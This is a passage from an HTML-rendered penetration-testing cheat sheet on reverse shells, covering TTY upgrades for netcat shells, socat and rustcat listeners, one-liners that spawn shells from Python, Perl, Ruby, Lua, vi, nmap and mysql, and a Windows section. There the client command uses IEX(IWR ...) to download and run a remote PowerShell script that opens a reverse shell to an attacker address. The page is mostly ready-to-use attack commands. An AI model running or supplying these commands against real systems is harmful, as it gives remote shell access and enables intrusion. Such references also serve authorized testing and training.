<a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="n">stty</span> <span class="n">raw</span> <span class="n">-echo</span><span class="p">;</span> <span class="n">fg</span>
<a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a>
<a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="n">reset</span>
<a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="n">export</span> <span class="n">SHELL</span><span class="p">=</span><span class="n">bash</span>
<a id="__codelineno-57-13" name="__codelineno-57-13" href="#__codelineno-57-13"></a><span class="n">export</span> <span class="n">TERM</span><span class="p">=</span><span class="n">xterm</span><span class="p">-</span><span class="n">256color</span>
<a id="__codelineno-57-14" name="__codelineno-57-14" href="#__codelineno-57-14"></a><span class="n">stty</span> <span class="n">rows</span> <span class="p">&lt;</span><span class="n">num</span><span class="p">&gt;</span> <span class="n">columns</span> <span class="p">&lt;</span><span class="n">cols</span><span class="p">&gt;</span>
</code></pre></div>
<p><img alt="" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/26a0.svg" title=":warning:" /> With Windows Terminal + WSL container,  <code>[CTRL] + [Z]</code> can get you out of / freeze the container.
To overcome this issue, run <code>nc</code> in a <code>tmux</code>, and send a <code>SIGTSTP</code> signal to the <code>nc</code> process.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1"># Enter in tmux</span>
<a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>tmux
<a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
<a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1"># Do your netcat stuff ...</span>
<a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">4242</span>
<a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
<a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1"># Create a new window in tmux</span>
<a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>ctrl+b<span class="w"> </span>c
<a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>
<a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="c1"># Find the PID of the nc process (column PID)</span>
<a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="c1"># | grep -i nc | grep -vi grep</span>
<a id="__codelineno-58-12" name="__codelineno-58-12" href="#__codelineno-58-12"></a>
<a id="__codelineno-58-13" name="__codelineno-58-13" href="#__codelineno-58-13"></a><span class="c1"># Send a SIGTSTP (ctrl+z) signal to the process</span>
<a id="__codelineno-58-14" name="__codelineno-58-14" href="#__codelineno-58-14"></a><span class="nb">kill</span><span class="w"> </span>-s<span class="w"> </span>TSTP<span class="w"> </span>&lt;PID&gt;
</code></pre></div>
<p>or use <code>socat</code> binary to get a fully tty reverse shell</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>socat<span class="w"> </span>file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:12345
</code></pre></div>
<p>Alternatively, <code>rustcat</code> binary can automatically inject the TTY shell command.</p>
<p>The shell will be automatically upgraded and the TTY size will be provided for manual adjustment.
Not only that, upon exiting the shell, the terminal will be reset and thus usable.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span>stty<span class="w"> </span>size<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rcat<span class="w"> </span>l<span class="w"> </span>-ie<span class="w"> </span><span class="s2">&quot;/usr/bin/script -qc /bin/bash /dev/null&quot;</span><span class="w"> </span><span class="m">6969</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>reset
</code></pre></div>
<p>Spawn a TTY shell from an interpreter</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">sh</span> <span class="n">-i</span>
<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="n">python3</span> <span class="n">-c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
<a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="n">python3</span> <span class="n">-c</span> <span class="s2">&quot;__import__(&#39;pty&#39;).spawn(&#39;/bin/bash&#39;)&quot;</span>
<a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="n">python3</span> <span class="n">-c</span> <span class="s2">&quot;__import__(&#39;subprocess&#39;).call([&#39;/bin/bash&#39;])&quot;</span>
<a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a><span class="n">perl</span> <span class="n">-e</span> <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
<a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="n">perl</span><span class="p">:</span> <span class="n">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
<a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a><span class="n">perl</span> <span class="n">-e</span> <span class="s1">&#39;print `/bin/bash`&#39;</span>
<a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a><span class="n">ruby</span><span class="p">:</span> <span class="n">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
<a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a><span class="n">lua</span><span class="p">:</span> <span class="n">os</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</code></pre></div>
<ul>
<li>vi: <code>:!bash</code></li>
<li>vi: <code>:set shell=/bin/bash:shell</code></li>
<li>nmap: <code>!sh</code></li>
<li>mysql: <code>! bash</code></li>
</ul>
<p>Alternative TTY method</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="n">www-data</span><span class="nv">@debian</span><span class="p">:/</span><span class="n">dev</span><span class="p">/</span><span class="n">shm</span><span class="p">$</span> <span class="n">su</span> <span class="p">-</span> <span class="n">user</span>
<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="n">su</span><span class="p">:</span> <span class="n">must</span> <span class="n">be</span> <span class="n">run</span> <span class="n">from</span> <span class="n">a</span> <span class="n">terminal</span>
<a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>
<a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="n">www-data</span><span class="nv">@debian</span><span class="p">:/</span><span class="n">dev</span><span class="p">/</span><span class="n">shm</span><span class="p">$</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">script</span> <span class="n">-qc</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span> <span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
<a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="n">www-data</span><span class="nv">@debian</span><span class="p">:/</span><span class="n">dev</span><span class="p">/</span><span class="n">shm</span><span class="p">$</span> <span class="n">su</span> <span class="p">-</span> <span class="n">user</span>
<a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a><span class="n">Password</span><span class="p">:</span> <span class="n">P4ssW0rD</span>
<a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>
<a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a><span class="n">user</span><span class="nv">@debian</span><span class="p">:~$</span> 
</code></pre></div>
<h2 id="fully-interactive-reverse-shell-on-windows">Fully interactive reverse shell on Windows</h2>
<p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p>
<p><strong>ConPtyShell uses the function <a href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</strong></p>
<p>Server Side:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="n">stty</span> <span class="n">raw</span> <span class="n">-echo</span><span class="p">;</span> <span class="p">(</span><span class="n">stty</span> <span class="n">size</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="p">|</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="n">3001</span>
</code></pre></div>
<p>Client Side:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">antonioCoco</span><span class="p">/</span><span class="n">ConPtyShell</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="nb">Invoke-ConPtyShell</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UseBasicParsing</span><span class="p">);</span> <span class="nb">Invoke-ConPtyShell</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="n">3001</span>
</code></pre></div>
<p>Offline version of the ps1 available at --&gt; <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">antonioCoco/ConPtyShell/Invoke-ConPtyShell.ps1</a></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner">Reverse Bash Shell One Liner</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey - Cheat Sheet Reverse shell</a></li>
<li><a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a></li>
<li><a href="https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell">Obtaining a fully interactive shell</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="February 23, 2026 21:07:51 UTC">February 23, 2026</span>
  </span>

    
    
    
    
  </aside>





                
  <div class="social-container">
    <b>Share this content</b>
    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
      <a class="a2a_button_x"></a>
      <a class="a2a_button_telegram"></a>
      <a class="a2a_button_linkedin"></a>
      <a class="a2a_button_email"></a>
      <a class="a2a_button_microsoft_teams"></a>
    </div>
    <br>
    <script async src="https://static.addtoany.com/menu/page.js"></script>
  </div>
  <script defer src="https://cloud.umami.is/script.js" data-website-id="49aad71c-7d98-4635-8bd5-b6799c8874f8"></script>

              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
    
  </body>
</html>